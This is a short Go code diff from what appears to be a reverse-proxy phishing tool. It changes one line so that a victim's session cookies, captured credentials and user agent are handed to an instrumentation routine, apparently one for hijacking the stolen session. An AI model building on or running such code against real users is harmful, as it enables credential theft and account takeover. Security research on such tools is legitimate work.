@@ -573,7 +573,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 									if err != nil {
 										log.Error(err.Error())
 									} else {
-										go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+										go nb.Instrument(victim.ID, victim.Cookies, string(creds), victim.UA)
 									}
 								}
 							}
